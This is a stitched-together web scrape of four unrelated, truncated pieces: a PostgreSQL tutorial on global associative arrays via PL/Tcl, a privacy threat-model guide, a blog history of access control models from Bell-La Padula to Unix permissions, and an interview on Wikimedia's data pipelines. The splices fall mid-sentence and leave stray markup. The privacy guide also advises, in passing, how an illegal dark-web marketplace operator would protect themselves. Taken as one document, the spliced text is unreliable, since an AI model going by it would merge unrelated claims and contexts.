<p>We got the results as expected. However, this code has some limitations because we are unable to fetch the values based on their keys. For example, the pincodes (1st and the 3rd elements) are fetched using their Indexes. If we are able to access the same pincodes based on their keys, then, the lookup will be more powerful. So, how to approach this requirement ? Let us discuss the approach further.&nbsp;</p>
<p><b>Associating or mapping a name or a key to a value</b></p>
<p>Thanks to PostgreSQL’s rich data types such as <strong>hstore</strong> or <strong>json</strong> which can be leveraged to perform such mapping.</p>
<p>Following is a sample code using a <strong>json</strong> static object.</p>
<pre>CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode JSON= '{"CA": 123456, "AZ": 123457, "OH": "123458", "CO": 123459}';<br>BEGIN<br>RAISE NOTICE 'CA state pincode %', v_pincode-&gt;&gt;'CA';<br>RAISE NOTICE 'OH state pincode %', v_pincode-&gt;&gt;'OH';<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;</pre>


<p>Let us execute the above created function and see the results.</p>

<pre><code>postgres=&gt; SELECT process_orders();
NOTICE:  CA state pincode 123456
NOTICE:  OH state pincode 123458
process_orders
----------------
t
(1 row)</code></pre>

<p>Now, we are able to make the lookup using a key possible with our PL/pgSQL code. Thus, by using a json type instead of an ARRAY we can implement the concept of associative arrays.&nbsp;</p>

<p><strong>Global Associative Arrays</strong></p>

<p>The json approach demonstrated above seems to be perfect, but it does not solve the problem of global or session level associative arrays. What this means is that the same associative array cannot be accessed using another function running in the same session. This is because of the lack of global variables or global arrays.&nbsp;</p>

<p><strong>How to make Global Associate Arrays possible with PostgreSQL ?</strong></p>

<p>Following are the 5 possible solutions with some or no limitations to each approach.&nbsp;</p>

<ol>
<li><strong>Declare the same json object in the other function.</strong></li>
</ol>

<ul>
<li>Requires duplicating the same variable and the same context.&nbsp;</li>
</ul>

<ol start="2">
<li><strong>Pass the json argument as a parameter to the other function.</strong></li>
</ol>

<ul>
<li>Pass the same value across functions. However, the argument lists may become huge to manage or debug.</li>
</ul>

<ol start="3">
<li><strong>Store this object in a table and load it in the function.</strong></li>
</ol>

<ul>
<li>Storing it in a Table and accessing the elements by selecting from the Table. This can be a heavy overhead.&nbsp;</li>
</ul>

<ol start="4">
<li><strong>Use set_config() approach, which set the object at a session level, and read it from the current_setting().&nbsp;</strong></li>
</ol>

<ul>
<li>If any value is set, an Exception block cannot view the configured settings. May become challenging while performing conversions from Oracle to PostgreSQL where a good amount of logic is written in the Exception block. May be great when we are not accessing any global variables in the exception block. We will be discussing this in detail in our future blog post.&nbsp;</li>
</ul>

<ol start="5">
<li><strong>Using a supported PostgreSQL language context.&nbsp;</strong></li>
</ol>

<ul>
<li>With this approach, we should be able to access the global variables across the exception blocks and also the non exception blocks.</li>
</ul>

<p>The first 4 approaches seem to be pretty straight forward and simple with their own limitations. But the last approach about using another language’s session context is something interesting and we are discussing that further.</p>

<p><strong>Using TCL to support Global Associative Arrays</strong></p>

<p>As we all know, PostgreSQL supports many trusted procedural languages such as PLPerl, PLPython, PLTCL, PLv8 etc. All these trusted languages guarantee that the program code written in that language will not be accessing the underlying physical files. Out of all these programming languages, we will be choosing a simple, safe and a powerful language called <span><a href="https://wiki.tcl-lang.org/page/pltcl">tickle (PLTCL)</a>.</span>&nbsp;</p>

<p>TCL language does support the associative array concepts and we will be leveraging this feature in a global way. This will give more flexibility of lookup of values using keys. Let us see the following example code to see how we can make the declaration of a global variable with tickle (TCL).</p>

<p><strong>TCL instructions<br></strong>As the first step, let’s declare a global variable (namespace) using the following TCL code.</p>

<pre><code>$ tclsh
% # Here, arr_ptr is a pointer to the namespace/global variable "pincodes"
% upvar 0 ::"pincodes" arr_ptr</code></pre>

<p>Now, let’s add a pincode value to this namespace (or the global variable).</p>

<pre><code>% set arr_ptr('CA') 123456
123456</code></pre>

<p>Let us now get the value which we set in the associative array.</p>

<pre><code>% set arr_ptr('CA')
123456</code></pre>

<p>Using the simple example created above, we have seen how we can declare a global variable and store the values using TCL.</p>

<p><strong>Using PLTCL to support Global Associative Arrays in PostgreSQL.</strong></p>

<p>To achieve the functionality of global associative arrays, let us embed the same code in PLTCL as seen in the following steps.</p>
<p><strong>Step 1 :</strong> Create the PLTCL Extension</p>

<pre><code>postgres=&gt; CREATE EXTENSION pltcl;
CREATE EXTENSION</code></pre>

<p><strong>Step 2 : </strong>Create a function using PLTCL to declare the Global Associative Array and set a value.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_set(TEXT, TEXT, TEXT) RETURNS VOID AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2) $3
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Step 3 : </strong>Create a function using PLTCL to get the value mapped to the key.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_get(TEXT, TEXT) RETURNS TEXT AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2)
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Testing</strong></p>

<p>Let us perform a test using the newly created PLTCL functions.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'CA', '123456');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_get('pincodes', 'CA');
pltcl_get
-----------
123456
(1 row)</code></pre>

<p>As seen in the above example, we are able to get data from the TCL context which is global. Which means, we are able to set the <strong>pincodes</strong> from one statement (using pltctl_set() ), and able to access it’s value from another statement (using pltcl_get()).&nbsp;</p>

<p><strong>Iterating over the Global Associative Arrays</strong></p>

<p>What is an array without an iterator, right? Let us leverage the same TCL code and create another function which iterates over the global array.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_itr(TEXT) RETURNS TABLE(key TEXT, value TEXT)
AS
$$
upvar 0 ::$1 arr_ptr
    foreach i  [array names arr_ptr] {
        return_next [list key $i value [set arr_ptr($i)]]
    }
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p>Now, let’s add a few more entries to `pincodes` global array and do the iteration test.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'AZ', '123457');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'OH', '123458');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'CO', '123459');
pltcl_set
-----------
(1 row)</code></pre>

<p>Let’s use the iterator function to get all the lists of available <strong>pincodes</strong> from the global array, as seen in the following block.</p>

<pre><code>postgres=&gt; SELECT * FROM pltcl_itr('pincodes');
key | value
-----+--------
CA  | 123456
CO  | 123459
OH  | 123458
AZ  | 123457
(4 rows)</code></pre>

<p>As seen above, this iterator is actually helping to iterate over the global associative array. We can use these values across multiple functions across the same session.&nbsp;</p>

<p><strong>Conclusion</strong></p>

<p>PostgreSQL offers a lot of flexibility in writing the code in multiple languages, which eventually enables us to inherit the power of other programming languages. As you have witnessed in this blog post, we leveraged the TCL’s features and are able to achieve the global associative arrays, which …</p></div></div></div></div></div></div></section></div>

            Establishing a threat model isn’t something easy to do. What is a threat model even? In this 0-to-1 guide, you will learn what a threat model is, how it can help you with your digital privacy, and how you can establish one correctly.
        </p>

        

        <h3 id="what-is-a-threat-model">What is a threat model?</h3>
<p>First, the essential question. What is that thing? <strong>A threat model allows you to precisely know what you are trying to protect yourself from</strong> when putting measures in place regarding your privacy.</p>
<p>Hesitating between using <a href="https://torproject.org/">Tor</a> or a <a href="https://en.wikipedia.org/wiki/Virtual_private_network">VPN</a>? A threat model will help you decide which option is the best one for you. In this example, you would say, “well, it’s obviously Tor! What is this guy thinking?”, which is a fair point. In terms of privacy and security, Tor is ideal. However, that doesn’t necessarily mean everyone should use it. The user experience is pretty bad compared to VPNs, a lot of websites request captchas when using Tor, and the connection is slower on average than when using a VPN.</p>
<p>So while Tor is definitely the best option (hands down) in terms of privacy, it’s not a great fit for the “average” user. In fact, it will probably even disappoint people as they will think that having privacy equals having a bad user experience.</p>
<p>However, imagine you are the creator of an illegal marketplace on the dark web. In that case, you should use Tor. Obviously. Because in that situation, the privacy you will have is much, much, much more important than the bad user experience you will have with Tor.</p>
<p>This is why threat models are essential. They help you decide and identify what you are protecting yourself from, and <strong>what measures you should put in place to efficiently do so</strong>.</p>
<h3 id="how-to-establish-a-threat-model">How to establish a threat model</h3>
<p>Establishing a threat model is fairly simple. Take a notebook, or your notes app, and start listing the entities and/or people you want to protect yourself from.</p>
<p>Let’s say I want to protect myself from the following entities:</p>
<ul>
<li>Facebook</li>
<li>Google</li>
</ul>
<p>The process is fairly simple. You identify the target (Facebook and Google in this example) and then you find ways to effectively protect yourself from these given targets. That’s how easy it is.</p>
<h4 id="case-study-protecting-yourself-from-facebook">Case study: Protecting yourself from Facebook</h4>
<p>In order to protect me from Facebook, I can take the following measures:</p>
<ol>
<li>Deactivate my account on Facebook, Instagram,… if I have one</li>
<li>Redirect all my friends to <a href="https://signal.org/">Signal</a> for messaging</li>
<li>Block any Facebook-related domain through a <a href="https://www.computerhope.com/jargon/d/dns-resolver.htm">DNS resolver</a></li>
</ol>
<p>The less extreme version of that would be to:</p>
<ol>
<li>Uninstall all the mobile Facebook apps and only use these through a desktop browser</li>
<li>Use a DNS resolver to block tracking domains Facebook uses</li>
<li>Use a “Use Signal” profile picture to progressively redirect friends to Signal</li>
<li>Avoid posting anything on Facebook, Instagram,…</li>
</ol>
<h4 id="case-study-protecting-yourself-from-google">Case study: Protecting yourself from Google</h4>
<p>In order to protect me from Google, I can take the following measures:</p>
<ol>
<li>Deactivate my Google account, and start using <a href="https://protonmail.com/">ProtonMail</a>/<a href="https://tutanota.com/">Tutanota</a>/<a href="https://mailbox.org/">MailBox</a>/… as an alternative for emails</li>
<li>Watch YouTube videos through an RSS feed or using <a href="https://redirect.invidious.io/">Invidio.us</a></li>
<li>Use a privacy-friendly search engine, like <a href="https://duckduckgo.com/">DuckDuckGo</a>, <a href="https://startpage.com/">StartPage</a>, or <a href="https://searx.me/">SearX</a></li>
<li>Probably other measures too, depending on which Google product you are regularly using</li>
</ol>
<p>The less extreme version of that would be to:</p>
<ol>
<li>Progressively redirect people to a new privacy-friendly email address, while also progressively changing account logins with this new email address (even better with email aliases!)</li>
<li>Watch YouTube videos without logging into YouTube while regularly clearing the browser history and cookies.</li>
<li>Use a privacy-friendly search engine, like DuckDuckGo, StartPage, or SearX</li>
<li>Probably other measures too, depending on which Google product you are regularly using</li>
</ol>
<h3 id="why-establishing-a-threat-model-matters">Why establishing a threat model matters</h3>
<p>You may find the set-up of a threat model silly. Doing this on purpose and going through all the processes may seem ridiculous. But it’s not.</p>
<p>Establishing a threat model allows you to have a clear picture of what you can and can’t do, depending on who you are protecting yourself from. It’s about clarity. It’s about knowing precisely what you should and shouldn’t do.</p>
<p>Having a threat model is especially useful when confronted with a stressful situation. It’s usually in unusual events that we tend to care less about our privacy.</p>
<p>Imagine for example that you are waiting for the train, and just at the second the train arrives, you are requested by an employee of the train station to give your email address so they can verify your identity (horrible example by the way, it’s just to clarify). Well, if you have a threat model, this is easy. Can you give your email address to an entity which you don’t necessarily trust? Yes or no. It’s a simple question. (In the unlikely event that this scenario takes place, make sure to use an email alias!)</p>
<p>However, if this event takes place and you don’t have a threat model, you will face a problem as there is no way for you to precisely and clearly know whether you are putting yourself at risk.</p>
<h3 id="conclusion">Conclusion</h3>
<p><strong>Establishing a threat model is something which everyone should do</strong>. It doesn’t matter whether you care or don’t care about your privacy. It works for every “level” of attention someone gives to privacy.</p>
<p>Finally, it takes just a few minutes to set up. You can do it very quickly, and results will be massive if done properly.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/controls.png" width="100%" alt="Access controls overview"></p>

<h2 id="evergreen-challenge">Evergreen Challenge</h2>

<p>Every cloud has its own identity and access management system. AWS and Google use a bunch
of JSON files specifying various rules. Open source projects like Kubernetes support
three concurrent access control models - attribute-based, role-based and
a webhook access control, all expressed using YAML. Some teams are going as far as
inventing their own programming language to solve this evergreen problem.</p>

<p>As many engineers before us, we faced the challenge of choosing the
design and the tooling from the kaleidoscope of JSON, YAML and custom languages
for our own software’s access controls. Which system is the best, and can there be one language to rule them all?
What are the properties of a good access control system, and what mistakes of the past should we avoid?</p>

<h2 id="time-sharing-and-first-pen-testers">Time Sharing and First Pen-testers</h2>

<p>In the early 1960s one computer could be accessed by one person, program and team at a time.
Computers were quite expensive; a PDP-1, for example, would cost you a whopping $120,000.
That’s close to $1M adjusted for inflation in 2021.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/pdp-1.jpg" width="100%" alt="PDP-1 in a computer history museum"></p>

<p><em>DEC PDP-1 in a computer history museum</em></p>

<p>You could securely use the computer for different applications as long as the files and data for
different projects were kept separate. That was a serious bottleneck, and by the mid-sixties manufacturers offered time-sharing systems
that allowed many folks to use computers at the same time.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/time-sharing.jpg" width="100%" alt="Fernando Corbató with MIT's IBM 7090"></p>

<p><em>Fernando Corbató - researcher working on time sharing with MIT’s IBM 7090</em></p>

<p>The arrival of time sharing made folks at the U.S. Air Force worried.
There could be two programs residing in the storage and sharing compute and memory at the same time.
What if a program working on a lower privilege level hacked the system and gained access to sensitive data of another program?</p>

<p>To assess the scope of the problem, USAF formed a special task force to
figure out the impact of such hacks and come up with a solution.
The team came back with some bad news: operating systems at the time were not designed
at all to protect from a malicious program. The executable had almost unrestricted
capability to reference any main and auxiliary memory locations.
The task force concluded that a new approach was needed [1]:</p>

<blockquote>
<p>The operating systems were not designed to be secure, provide a malicious user
with any number of opportunities to subvert the operating system itself.</p>

<p>…</p>

<p>A system designed to be secure, containing;</p>

<p>A) An adequate system access control mechanism</p>

<p>B) An authorization mechanism</p>

<p>…</p>
</blockquote>

<h2 id="bell-la-padula-security-model">Bell-La Padula Security Model</h2>

<p>In 1972, two computer scientists were assigned with the task of designing such a system [2].</p>

<blockquote>
<p>In the summer of 1972, The MITRE Corporation initiated its task to produce a report titled “Secure Computer Systems.”
The modeling task fell to Len La Padula and me. David E Bell.</p>
</blockquote>

<p>In 1972-1974 David E. Bell and Leonard J. La Padula came up with the theoretical foundations of access control systems [3]
and then worked with programmers to implement that in the most promising O.S. at the time — Multics [4].
In the Multics paper, they defined elements of both models still used to this day — subjects,
objects and access control lists.</p>

<ul>
<li><code>subjects</code> are actors, like processes and programs in execution.</li>
<li><code>objects</code> are passive things, like data, files, programs, subjects.</li>
</ul>

<p><img src="https://goteleport.com/blog/images/2021/access/subjects-objects.png" width="100%" alt="Subjects accessing objects"></p>

<p><em>Subjects accessing objects. Here and below are the original figures from the paper.</em></p>

<p>Subjects can access objects. These access modes are governed by access <code>attributes</code>:</p>

<ul>
<li><code>e</code> - no access, <code>r</code> - read-only, <code>a</code> - can write, but not read, <code>w</code> - can read and write.</li>
</ul>

<p>They defined access of subject to object with a triple:</p>
<pre><code>(subject, object, attribute)</code></pre>
<p>Objects are organized in a tree-like structure, forming a hierarchy.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/object-structure.png" width="100%" alt="Object structure"></p>

<p><em>Object structure</em></p>

<p>An access matrix specifies access modes (<code>e</code>, <code>r</code>, <code>a</code>, <code>w</code>) in which subjects can access objects.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/access-matrix.png" width="100%" alt="Access Matrix"></p>

<p>Because MITRE corporation’s research was funded by the military, you would find a couple of parts unfamiliar to
most Unix users — category and classification levels for the U.S. Military — “unclassified”, “confidential”, “secret”, “top secret”.
Categories are general topics such as “Nuclear”, “NATO” or “Crypto”.</p>

<p>Security level assigned to an individual and object is a pair:</p>
<pre><code>(classification, set of categories)</code></pre>
<p>A user can access a document if their security level “dominates” the document level:</p>
<pre><code>(class 1, category-set 1) dominates (class 2, category-set 2) if and only if

class 1&gt;= class 2 and category-set 1 includes category-set 2 as a subset</code></pre>
<p><strong>Simple Security Property</strong></p>

<p>The researchers have defined a first property, as a simple security property:</p>

<p>For a triplet <code>(subject, object, read)</code> the security level of a subject always “dominates” security level of an object.
In other words, subjects can only read objects with the same or lower security level.
This property is also sometimes called “Read down” or “ss-property”.</p>

<p><strong>Star Property</strong></p>

<p>Bell and La Padula noticed that “simple security property” is not enough to protect classified
information. A malicious program could pass classified information along by reading the classified
docs on one level and writing on lower level:</p>

<p><img src="https://goteleport.com/blog/images/2021/access/star-property.png" width="100%" alt="Star property"></p>

<p>They called it “*-property”:</p>

<blockquote>
<p>in any state, if a subject has simultaneous “observe” access to object-1 and “alter”
access to object-2, then level (object-1) is dominated by level (object-2)</p>
</blockquote>

<p>In other words, you cannot read objects at higher security level and write
to objects at lower security level. Some folks call this property “Write Up”.
With this rule in place, any system drifts towards higher and higher clearance level
documents and it creates a practical problem — what if you still need to communicate the
level “down”? They defined “trusted subjects”, exceptions to the “*-property”
rule to communicate some information down and lower clearance of the documents.</p>

<p><strong>Discretionary and Mandatory</strong></p>

<p>To conform to military regulations, the researchers defined a “mandatory” or “non-discretionary” security policy —
an individual may not exercise their judgment to violate access standard, and the enforcement
is mandatory.</p>

<p>Two systems have emerged: Mandatory Access Controls (MAC), in which individuals
have no say in whether to set up their access levels, and Discretionary Access Control (DAC), in which folks
have some say who can access what.</p>

<p>Discretionary security is defined by access matrix above and specified as “ds-property”:</p>

<blockquote>
<p>if (subject-i, object-j, attribute-x) is a current access … then attribute-x is recorded
in the (subject-i, object-j) component of M …</p>
</blockquote>

<p>In other words, subjects can access objects if there is a matching access attribute
in the matrix.</p>

<p><strong>Basic Security Theorem</strong></p>

<p>Bell and La Padula defined “Basic security theorem” as a combination of
“ss-property”, “*-property” and “ds-property’.</p>

<p>In their assessment, the system is secure if:</p>

<ul>
<li>Users can only read resources at lower or equal security levels (Read Down)</li>
<li>Subjects cannot read objects at higher level and write to objects at lower level (Write Up)</li>
<li>System enforces access attributes on any subject-object access.</li>
</ul>

<p>The researchers were excited about “inductive nature” of the Basic Security Theorem — the system
will stay secure through all transitions as long as these three rules are enforced.</p>

<p>In the security world, this is also called security invariant — a property that system
keeps true at all times despite all the changes.</p>

<p><strong>Multics</strong></p>

<p><img src="https://goteleport.com/blog/images/2021/access/multics.jpg" width="100%" alt="Visicalc on Multics"></p>

<p><em>Visicalc running on Multics</em></p>

<p>Based on this paper, Multics engineers introduced access control lists — <code>ACL</code>.
Multics “ACLs” were composed of <code>(process, ring bracket)</code> pairs, where process is analogue of
the paper’s subject and ring bracket is a clearance level.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/acls.png" width="100%" alt="Multics ACLs"></p>

<p><em>Multics ACLs. Multics Paper</em></p>

<p>Objects could be “directory segments”, data segments, certain I/O devices, certain
address spaces and sockets.</p>

<p>Multics stored ACLs in the parent directory of an object and manipulated them
by altering the directory properties. Control over an object was represented
by write permission on an object’s directory.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/segment.png" width="100%" alt="Adding Segment to DIR"></p>

<p><em>Adding Segment to DIR. Multics Paper</em></p>

<p>A request to give access to an object is allowed only if the requesting subject
has current <code>w</code> access to the parent of the object.</p>

<p>Imagine a situation when a user created unclassified folder <code>Or</code>, then in it,
created a secret folder <code>O1</code> and placed unclassified file <code>O2</code> in it.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/compatibility.png" width="100%" alt="A need for compatibility"></p>

<p><em>A need for compatibility. Multics Paper</em></p>

<p>An unclassified user can’t access the file <code>O2</code> because they can’t access the secret folder <code>O1</code>.
This would have violated the ss-property — because unclassified users can’t read the
secret data and *-property, where users can’t read secret data and write to non-secret files
at the same time. They called it “The need for compatibility” — a child’s object
security levels should be higher than the parent’s object security levels.</p>

<h3 id="modern-day-descendants-of-bell-la-padula-model">Modern-Day Descendants of Bell-La-Padula Model</h3>

<p>Chances are, you are using discretionary access control implementation of the Bell-La-Padula
model every time you access a file on your system.</p>

<p><strong>Discretionary Access Controls</strong></p>

<p>Unix devs were frustrated with Multics’ complexity. Even Unix itself is a pun on Multics —
“Uniplex information and computing service”,  compared to Multics’  “Multiplex information and computer services”.
They dropped most of the complex stuff and kept only the discretionary part securing access to files with permissions.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/ken-dennis.jpg" width="100%" alt="Ken Thompson and Dennis Ritchie"></p>

<p><em>Ken Thompson and Dennis Ritchie hacking on PDP-11 and probably ranting about Multics complexity</em></p>

<p>DAC defines an owner of a resource, for example a file. A file owner specifies what others
can do to this file. Linux access control list system defines a set of permissions - read <code>(r)</code>, write <code>(w)</code> and execute <code>(x)</code>.
Users are divided into three classes: owners, groups and other. Every Linux file has a list of
access controls defined for every user class. Here is, for example an ACL for a file “animals.pl” on my computer:</p>
<div><pre><code data-lang="bash">$ ls -l animals.pl
-rw-r--r-- <span>1</span> sasha admins <span>187</span> Nov <span>28</span> 15:14 animals.pl</code></pre></div>
<p>This ACL says that user <code>sasha</code> is allowed to read and write …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h6>What is the company about? What are you building?</h6><p>The data engineering team at Wikimedia maintains what would be a traditional data pipeline for product teams to gather data to aid in product execution. What is different in the open knowledge ecosystem is that much of the metadata about Wikipedia is also public. This means that you can get a <a href="https://dumps.wikimedia.org/">myriad of datasets</a> with <a href="http://stats.wikimedia.org/">pageviews for every article</a>, unique devices, editors per country, etc.<br></p><p>All this data is delivered every hour and has been so for more than 15 years. It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP. Maintaining all the pipelines for data delivery for a system that <a href="https://grafana.wikimedia.org/d/000000500/varnish-caching?viewPanel=5&amp;orgId=1&amp;refresh=15m">at peak gets 200,000 requests </a>per second is needless to say, quite a task.&nbsp;&nbsp;</p><p>‍</p><blockquote>It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP<br></blockquote><h6>Can you describe the high level data architecture? Wikipedia is pretty open and I know you use Cassandra, Druid, Kafka, how those work together. In other words, what’s the data path from a GET request to a wikipedia page to something you can render on a graph.</h6><p>Something that is not well-known is that the whole puppet repo that describes Wikipedia's is public and you can take a look at it on<a href="https://github.com/wikimedia/puppet"> github</a>. To this day I find this impressive, that every single piece of infra of all Wikipedia's systems is described there. We also provide <a href="https://meta.wikimedia.org/wiki/Wikimedia_servers#/media/File:Wikipedia_webrequest_flow_2020.png">pretty pictures of the stack.</a><br></p><p>The data stack is very standard. As you mentioned we have Kafka for data intake, Hadoop as a persistent storage and from those two data gets ingested into Cassandra or Druid. There are different pipelines with different bells and whistles, some of them have a JSON <a href="https://schema.wikimedia.org/#!/">schema registry</a> and some others parse data out of the HTTP requests directly.&nbsp; In Wikipedia, 97% of requests at all times are cached and thus served from the CDN via Varnish. So, in order to gather all this data, we need Varnish to be able to talk to Kafka, we have a custom piece called varnishkafka that is a source of joy (#not) for our SRE team. The migration to Apache Traffic Service will eventually render this piece of infra obsolete.&nbsp;<br></p><p>There are two distinct sources of data: data from <strong>readers </strong>and <strong>editors</strong>. While data for readers is very high volume is quite "simple". It can be thought as simple pageviews. Edit data is however a lot more complicated and in order to harvest it properly we developed a <a href="https://en.wikipedia.org/wiki/Lambda_architecture">Lambda-ish architecture</a>. We source this data two ways, once a month from the MediaWiki database directly and via Spark, after 2 days of processing in a ~60 nodes hadoop cluster we create large <a href="https://wikitech.wikimedia.org/wiki/Analytics/Data_Lake/Edits">denormalized tables</a>.&nbsp; And at the same time we have event streams of data that publish every edit event to wikipedia as a json blob real time and those also get persisted on hadoop. We made a very conscious decision to use <a href="https://techblog.wikimedia.org/2020/09/10/wikimedias-event-data-platform-or-json-is-ok-too/">JSON versus AVRO</a> in most of our data pipelines and, since then, the Kafka ecosystem has moved more towards being a lot more friendly towards JSON. Makes sense, because JSON is a lot easier to debug.&nbsp;<br></p><p>The visualization layer is Superset, a nifty UI tool that can be used against druid but also <a href="https://prestodb.io/">Presto</a>, a very fast data query engine developed by Facebook that can be deployed on top of hadoop and it is fully ANSI SQL compliant.</p><h6>Wikipedia does not use any cloud provider, how does that change the way architecture is designed?</h6><p>Everything is developed from the ground up so we favor open source solutions tried and tested at scale. Much of the data pipeline of Wikipedia exists thanks to Facebook and LinkedIn open source efforts.</p><p>‍<br></p><h6>Also, you only use open source software, how do you pick the right tool for the job? Are software licenses a limitation? Could you use Mongo or Elastic for example?</h6><p>If we need a piece of software that, for example, pulls data from Kafka we survey the ecosystem and look at what exists that is tried and tested and fully open source. We do couple small prototypes and evaluate results. See for example our recent spike on <a href="https://wikitech.wikimedia.org/wiki/Analytics/Systems/Cluster/Workflow_management_tools_study">Airflow and others</a>.&nbsp; Licenses that do not provide the same level of freedom as <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0</a> are a problem. We cannot, for example,&nbsp; use the licenses for Kafka Connect which are too restrictive. We <a href="https://diff.wikimedia.org/2014/01/06/wikimedia-moving-to-elasticsearch/">have been using Elastic since 2014</a> but that, with their new license, might need to change.&nbsp;</p><p>‍<br></p><h6>What are some of the hardest data problems you’ve had to solve so far?</h6><p>Something that I have learned in these 20 years of work is that most of the real hard problems have to do with people, rather than technology.</p><p>Now, I would say the hardest problems in the data realm on 2021 have to do with Privacy. At Wikipedia Privacy is paramount (there cannot be truly free access to knowledge without a guarantee of privacy) and we had to "invent" methods to calculate in privacy-conscious ways metrics that are the norm for web properties, like Monthly Active Users. You can see <a href="https://diff.wikimedia.org/2016/03/30/unique-devices-dataset/">how we did it.</a> Still, the hardest problem was probably communicating effectively how much we care about Privacy.</p><p>‍</p><h6>What are the hard ones still unsolved?</h6><p>Data quality issues are kind of a "<a href="https://en.wikipedia.org/wiki/Fractal">fractal</a>" problem, you are never done eliminating those completely. <a href="https://phabricator.wikimedia.org/T211833">Here</a> is an example of a problem with data quality that was invisible to data throughput alarms and here is the first idea we had on how to partially solve issues like these (spoiler: entropy counts). Now, these examples make apparent how other quality issues of more complex nature would slip by.&nbsp;</p><h6>How did the architecture change during your 6 years at wikipedia?</h6><p>I would say it is recently that streaming or event-based architectures&nbsp; have become an achievable reality, little by little we are moving towards a world with more <a href="https://diff.wikimedia.org/2017/03/20/eventstreams/">streaming services.</a>&nbsp;</p><h6>Tell us some interesting numbers (traffic, rows, gigabytes you store, process, infra costs and so on)</h6><p>Wikipedia's <a href="https://wikimediafoundation.org/about/financial-reports/">budget is public</a>, the site and the 400 people on staff plus a number of projects and chapters are run with a budget of about $100 million dollars per year. The whole data stack hardware costs are minimal, less than a million dollars per year for about 3PB of data. We process and aggregate a lot of data but also, according to our privacy policy, a lot of it is discarded.</p><h6>What’s the most interesting use case solved with data. I know you have <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">pretty interesting blog posts</a> about it.</h6><p>My two favorite projects are more data scienc-y than data engineer-y and in both I collaborated with our team of Researchers which are the ones that really came into gauge whether the engineering ideas are mathematically sound.<br></p><p><strong>Bot detection</strong>: It took us a bit but we finally were able to flag a lot of the automated traffic that Wikipedia gets and tag it as such on our data releases and internal reports. Some of this traffic is benign (in the sense of it only using resources). An <a href="https://phabricator.wikimedia.org/T273741">example</a>.&nbsp; Other traffic, however, is not so innocuous. There are many attempts to manipulate Wikipedia's top pageview lists, for example. Most recently someone was trying to add a bunch of obscene terms to the top pageview list of Hungarian Wikipedia.</p><p>While on first instance, this seems like a simple classification problem, getting a labeled dataset to do prediction is actually not that simple. It&nbsp; requires building pseudo-sessions on top of data that has no common identifiers to know that two requests came from the same entity. We ended up using heuristics rather than ML and things worked out pretty well. You can read about the details of it <a href="https://techblog.wikimedia.org/2020/10/05/bot-or-not-identifying-fake-traffic-on-wikipedia/">here</a>.<br></p><p><strong>Censorship Alarms: </strong>We wanted to identify events in which active censorship of Wikipedia sites is ongoing. Wikipedia was blocked in Turkey for years and it is today blocked in Mainland China. Besides these countries like Iran block Wikipedia on and off. Looking at that problem in detail we realized that it had a lot in common with problems with data quality so we used some of the same techniques to alarm when "it seemed" a country had an anomalous traffic pattern. Again, this is less easy than it seems at first sight because you do not want to alarm unnecessarily and uniform traffic drops do not constitute an event. Anomalous traffic drops do. See how we did it <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">here</a>.&nbsp;&nbsp;</p><p>‍<br></p><h6>What are the most interesting, unexpected, or challenging lessons that you have learned? I guess there are plenty of them related to user privacy. How that changes in comparison to a “regular company”, what things you need to be careful when dealing with data.</h6><p>Lessons learned are many: in environments where the work is principle-based rather than profit based defining metrics is not easy.&nbsp; When everyone cares a lot about the larger mission of their work there is going to be a lot of strong discussions, once consensus is reached execution is fast with zero management oversight. Also, principles are very useful when choices are needed so in a way, working on a strong principle based organization makes some choices easy (ex: only use open source, preserve the right to fork) even if those choices imply a lot of work.</p><h6>How was your team organized: people, roles. What was your objective as a team? I guess one of them would be to create internal tools but I know you have some external tools and data.</h6><p>The larger Technology team reports to the CTO, there are several parallel teams: Security, SRE, Data Engineering, Performance... Those teams work independently but coordinate among themselves.&nbsp;The mission of the Data Engineering team is to serve internal customers but also the large external community. I think for a team in an organization as large in impact as Wikimedia is crucial to have a mission statement, otherwise it is easy to get lost in the many (infinite, really) requests for work. Our mission was to "empower and support data informed decision making across the Foundation <strong>and</strong> the Community". We make Wikimedia related data available for querying and <strong>analysis</strong> to both Wikimedia employees and the different Wiki communities and stakeholders."<br>This mission, notice, involves serving a large group of stakeholders, the community of editors that do not …</p></div></div></div>

